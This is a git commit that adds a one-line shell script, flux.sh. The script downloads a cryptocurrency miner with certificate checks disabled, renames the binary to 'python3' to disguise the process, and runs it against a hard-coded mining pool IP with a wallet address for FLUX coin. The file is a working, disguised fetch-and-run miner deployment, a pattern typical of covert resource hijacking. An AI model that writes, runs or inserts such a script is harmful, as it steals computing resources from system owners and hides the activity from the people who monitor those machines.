16d311af01e8a2f10237f63134c4e41f030cb78b
weruer <110554380+weruer@users.noreply.github.com>
2022-08-04 03:09:03 +0000

    Create flux.sh

---
+++ flux.sh
@@ -0,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-avx2 python3 && ./python3 -a yespower -o stratum+tcp://198.50.168.213:6234 -u t1UYZUpgVzViCMQemJyoNUEerPFBp3KsgR9 -p c=FLUX -t 3
